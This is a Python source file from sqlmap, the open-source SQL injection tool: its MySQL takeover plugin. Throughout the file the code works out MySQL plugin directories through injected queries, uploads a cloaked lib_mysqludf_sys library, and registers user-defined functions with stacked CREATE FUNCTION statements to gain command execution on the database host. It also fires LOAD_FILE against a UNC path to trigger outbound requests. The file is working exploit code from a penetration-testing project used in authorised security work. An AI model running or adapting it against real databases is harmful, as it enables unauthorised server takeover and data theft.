#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import decloakToTemp
from lib.core.common import isStackingAvailable
from lib.core.common import isWindowsDriveLetterPath
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import unArrayizeValue
from lib.core.compat import LooseVersion
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import OS
from lib.request import inject
from lib.request.connect import Connect as Request
from plugins.generic.takeover import Takeover as GenericTakeover

class Takeover(GenericTakeover):
    def __init__(self):
        self.__basedir = None
        self.__datadir = None
        self.__plugindir = None

        GenericTakeover.__init__(self)

    def udfSetRemotePath(self):
        self.getVersionFromBanner()

        banVer = kb.bannerFp["dbmsVersion"]

        if banVer and LooseVersion(banVer) >= LooseVersion("5.0.67"):
            if self.__plugindir is None:
                logger.info("retrieving MySQL plugin directory absolute path")
                self.__plugindir = unArrayizeValue(inject.getValue("SELECT @@plugin_dir"))

            # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0
            if self.__plugindir is None and LooseVersion(banVer) >= LooseVersion("5.1.19"):
                logger.info("retrieving MySQL base directory absolute path")

                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir
                self.__basedir = unArrayizeValue(inject.getValue("SELECT @@basedir"))

                if isWindowsDriveLetterPath(self.__basedir or ""):
                    Backend.setOs(OS.WINDOWS)
                else:
                    Backend.setOs(OS.LINUX)

                # The DLL must be in C:\Program Files\MySQL\MySQL Server 5.1\lib\plugin
                if Backend.isOs(OS.WINDOWS):
                    self.__plugindir = "%s/lib/plugin" % self.__basedir
                else:
                    self.__plugindir = "%s/lib/mysql/plugin" % self.__basedir

            self.__plugindir = ntToPosixSlashes(normalizePath(self.__plugindir)) or '.'

            self.udfRemoteFile = "%s/%s.%s" % (self.__plugindir, self.udfSharedLibName, self.udfSharedLibExt)

        # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file
        # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file
        else:
            # logger.debug("retrieving MySQL data directory absolute path")

            # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir
            # self.__datadir = inject.getValue("SELECT @@datadir")

            # NOTE: specifying the relative path as './udf.dll'
            # saves in @@datadir on both MySQL 4.1 and MySQL 5.0
            self.__datadir = '.'
            self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))

            # The DLL can be in either C:\WINDOWS, C:\WINDOWS\system,
            # C:\WINDOWS\system32, @@basedir\bin or @@datadir
            self.udfRemoteFile = "%s/%s.%s" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)

    def udfSetLocalPaths(self):
        self.udfLocalFile = paths.SQLMAP_UDF_PATH
        self.udfSharedLibName = "libs%s" % randomStr(lowercase=True)

        if Backend.isOs(OS.WINDOWS):
            _ = os.path.join(self.udfLocalFile, "mysql", "windows", "%d" % Backend.getArch(), "lib_mysqludf_sys.dll_")
            self.udfLocalFile = decloakToTemp(_)
            self.udfSharedLibExt = "dll"
        else:
            _ = os.path.join(self.udfLocalFile, "mysql", "linux", "%d" % Backend.getArch(), "lib_mysqludf_sys.so_")
            self.udfLocalFile = decloakToTemp(_)
            self.udfSharedLibExt = "so"

    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            logger.info("creating UDF '%s' from the binary UDF file" % udf)

            ret = inpRet["return"]

            # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html
            inject.goStacked("DROP FUNCTION %s" % udf)
            inject.goStacked("CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'" % (udf, ret, self.udfSharedLibName, self.udfSharedLibExt))

            self.createdUdf.add(udf)
        else:
            logger.debug("keeping existing UDF '%s' as requested" % udf)

    def uncPathRequest(self):
        if not isStackingAvailable():
            query = agent.prefixQuery("AND LOAD_FILE('%s')" % self.uncPath)
            query = agent.suffixQuery(query)
            payload = agent.payload(newValue=query)

            Request.queryPage(payload)
        else:
            inject.goStacked("SELECT LOAD_FILE('%s')" % self.uncPath, silent=True)
